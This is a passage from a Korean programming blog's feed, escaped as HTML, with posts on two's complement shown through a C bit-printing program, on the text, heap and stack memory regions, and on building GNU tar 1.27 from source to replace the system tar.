&lt;p&gt;컴퓨터에서 음수를 표시할 때, 2의 보수를 사용하여 표시한다.&lt;/p&gt;
&lt;p&gt;현재 대부분의 컴퓨터에서 음수를 표시할 때, 2의 보수를 사용하여 표시한다.&lt;/p&gt;
&lt;p&gt;예를들어 8bit에서 음수를 표시할 때를 살펴보겠다.&lt;/p&gt;
&lt;p&gt;숫자 &lt;code class=&quot;language-text&quot;&gt;5&lt;/code&gt;가 있다. 이를 비트로 표시할 경우 다음과 같이 표시할 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;5: 0 0 0 0 0 1 0 1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;우선 0을 1로 바꾸고 1을 0으로 바꾼다. 그렇게 할 경우&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;1 1 1 1 1 0 1 0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 된다. 여기에 +1을 해주면 2의 보수로 변경이 완료된다. 음수를 양수로 바꾸는 것도 똑같이 하면 된다.&lt;/p&gt;
&lt;p&gt;이제 프로그램을 통하여 확인을 해보겠다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;root@ubuntu&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;~&lt;/span&gt;# cat complement&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;c
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; argc&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; num&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; bin&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;input number : &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;num&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    bin &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;num&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; bin &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot; | &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;입력한 숫자를 비트단위로 쪼개 출력하는 프로그램이다.&lt;/p&gt;
&lt;p&gt;정상적으로 작동하는지 확인해 보겠다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# gcc -o complement complement.c&lt;/span&gt;
root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# ./complement&lt;/span&gt;
input number &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;256&lt;/span&gt;
0000 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0000 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0000 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0000 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0000 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0001 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0000 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0000
root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# ./complement&lt;/span&gt;
input number &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt; -1
&lt;span class=&quot;token number&quot;&gt;1111&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1111&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1111&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1111&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1111&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1111&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1111&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1111&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;정상적으로 작동하는것 같다.&lt;/p&gt;
&lt;p&gt;그럼 간단하게 5와 -5를 비교해 보겠다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# ./complement&lt;/span&gt;
input number &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;
0000 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0000 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0000 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0000 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0000 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0000 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0000 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0101
root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# ./complement&lt;/span&gt;
input number &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt; -5
&lt;span class=&quot;token number&quot;&gt;1111&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1111&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1111&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1111&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1111&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1111&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1111&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1011&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;5는 정상적으로 출력이 되었다. -5를 2의 보수법을 이용하여 계산해 보겠다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;0000 | 0000 | 0000 | 0000 | 0000 | 0000 | 0000 | 0101 = 5
1111 | 1111 | 1111 | 1111 | 1111 | 1111 | 1111 | 1010
1111 | 1111 | 1111 | 1111 | 1111 | 1111 | 1111 | 1011 = -5&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;1, 2, 3순서대로 변환을 하게되면 정상적으로 처리가 됨을 알 수 있다.&lt;/p&gt;
&lt;p&gt;그럼 이번에는 임의로 비트를 조절해 그 값이 음수를 나타내는지 확인을 해보겠다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;root@ubuntu&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;~&lt;/span&gt;# cat check&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;c
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; argc&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; num &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xFFFFFFFB&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// -5&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;%d\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; num&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;임의로 -5의 값을 주었다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# gcc -o check check.c&lt;/span&gt;
root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# ./check&lt;/span&gt;
-5&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 프로그램을 사용하여 2의 보수가 적용되었다는 것을 알 수 있다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Data segment]]></title><description><![CDATA[Text(Code)영역 기계어가 존재하는 영역으로, 변수 컨트롤을 주소를 이용하여 컨트롤한다. ex. mov 0xc(%ebp),%eax Heap 프로그램 수행중 동적으로 할당된 변수가 존재하는 공간이다. C…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Mon, 07 Sep 2015 00:00:00 GMT</pubDate><content:encoded>&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Text(Code)영역&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;기계어가 존재하는 영역으로, 변수 컨트롤을 주소를 이용하여 컨트롤한다.&lt;/li&gt;
&lt;li&gt;ex. mov 0xc(%ebp),%eax&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Heap&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;프로그램 수행중 동적으로 할당된 변수가 존재하는 공간이다.&lt;/li&gt;
&lt;li&gt;C언어의 경우 수동으로 해제하거나, 프로그램 종료시 해제되기 때문에, 수동으로 해제하지 않을 경우 &lt;strong&gt;메모리누수현상&lt;/strong&gt;이 발생할 수 있다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Stack&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;프로그램 동작에서 지역변수가 들어가는 공간으로, 영역을 &lt;code class=&quot;language-text&quot;&gt;Base Pointer&lt;/code&gt;(ex. ebp)와 &lt;code class=&quot;language-text&quot;&gt;Stack Pointer&lt;/code&gt;(ex. esp)를 기준으로 공간을 관리한다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;</content:encoded></item><item><title><![CDATA[tar upgrade]]></title><description><![CDATA[tar의 버전이 낮아 xz등 여러 압축형식을 한번에 해제할수 없어 tar버전업을 하게되었다. 굳이 tar를 안쓰고 xz으로 해제한 뒤, tar로 풀기를 하여도 되지만 하고싶어서 하게되었다. 이 기능은 1.15.1버전부터 가능하게 되었다. 우선 tar…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sun, 06 Sep 2015 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;tar의 버전이 낮아 xz등 여러 압축형식을 한번에 해제할수 없어 tar버전업을 하게되었다. 굳이 tar를 안쓰고 xz으로 해제한 뒤, tar로 풀기를 하여도 되지만 하고싶어서 하게되었다.&lt;/p&gt;
&lt;p&gt;이 기능은 &lt;strong&gt;1.15.1버전&lt;/strong&gt;부터 가능하게 되었다.&lt;/p&gt;
&lt;p&gt;우선 tar를 받아주어야 한다. tar는 GNU프로젝트에 속하므로, GNU에 들어가 받으면 된다. 한국서버는 &lt;a href=&quot;http://ftp.kaist.ac.kr/gnu/gnu/&quot;&gt;http://ftp.kaist.ac.kr/gnu/gnu/&lt;/a&gt;로 들어가면 된다.&lt;/p&gt;
&lt;p&gt;현재 &lt;a href=&quot;http://ftp.kaist.ac.kr/gnu/gnu/tar/tar-1.28.tar.gz&quot;&gt;1.28버전&lt;/a&gt;이 가장 최신버전이다. 하지만 컴파일에러가 발생하여 1.27버전을 사용하도록 하겠다.&lt;/p&gt;
&lt;p&gt;우선 wget을 이용하여 &lt;code class=&quot;language-text&quot;&gt;/usr/local/src/&lt;/code&gt;폴더에 받아준다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost root&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# cd /usr/local/src/&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost src&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# wget http://ftp.kaist.ac.kr/gnu/gnu/tar/tar-1.27.tar.gz&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost src&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# tar zxf tar-1.27.tar.gz&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost src&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# cd tar-1.27&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;여기서 &lt;code class=&quot;language-text&quot;&gt;./configure&lt;/code&gt;파일을 실행시켜 준다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost tar-1.27&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# ./configure&lt;/span&gt;
checking &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; a BSD-compatible install&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;. /usr/bin/install -c
checking whether build environment is sane&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;. &lt;span class=&quot;token function&quot;&gt;yes&lt;/span&gt;
checking &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; a thread-safe &lt;span class=&quot;token function&quot;&gt;mkdir&lt;/span&gt; -p&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;. /bin/mkdir -p
checking &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; gawk&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;. &lt;span class=&quot;token function&quot;&gt;gawk&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;. 생략 &lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.
checking whether &lt;span class=&quot;token function&quot;&gt;mkfifo&lt;/span&gt; rejects trailing slashes&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;. &lt;span class=&quot;token function&quot;&gt;yes&lt;/span&gt;
checking whether &lt;span class=&quot;token function&quot;&gt;mknod&lt;/span&gt; can create fifo without root privileges&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;. configure: error: &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;/usr/local/src/tar-1.27&apos;:
configure: error: you should not run configure as root &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;set &lt;span class=&quot;token assign-left variable&quot;&gt;FORCE_UNSAFE_CONFIGURE&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; environment to bypass this check&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
See &lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;&lt;/span&gt;config.log&apos; &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;more&lt;/span&gt; details&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;에러를 보게되면 &lt;code class=&quot;language-text&quot;&gt;set FORCE_UNSAFE_CONFIGURE=1&lt;/code&gt;을 환경변수로 추가해야 에러를 무시할수 있다고 한다. 하라는데로 해주고 다시 컴파일한다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost tar-1.27&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# export FORCE_UNSAFE_CONFIGURE=1&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost tar-1.27&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# ./configure; make; make install;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;configure&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;make&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;make install&lt;/code&gt;을 순서대로 진행해 주게 되면 /usr/local/bin/폴더에 정상적으로 컴파일된 tar가 생성되게 된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost tar-1.27&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# /usr/local/bin/tar --version&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;GNU &lt;span class=&quot;token function&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1.27&lt;/span&gt;
Copyright &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2013&lt;/span&gt; Free Software Foundation, Inc.
License GPLv3+: GNU GPL version &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt; or later &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;http://gnu.org/licenses/gpl.html&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;.
This is &lt;span class=&quot;token function&quot;&gt;free&lt;/span&gt; software: you are &lt;span class=&quot;token function&quot;&gt;free&lt;/span&gt; to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by John Gilmore and Jay Fenlason.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이제 새로운 버전을 기존의 버전이 있던 곳에 대체해야 한다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost tar-1.27&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# whereis tar&lt;/span&gt;
tar: /bin/tar /usr/local/bin/tar /usr/include/tar.h /usr/share/man/man1/tar.1.gz
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost tar-1.27&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# mv /bin/tar /bin/tar_old&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost tar-1.27&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# cp /usr/local/bin/tar /bin/tar&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost tar-1.27&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# tar --version&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;GNU &lt;span class=&quot;token function&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1.27&lt;/span&gt;
Copyright &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2013&lt;/span&gt; Free Software Foundation, Inc.
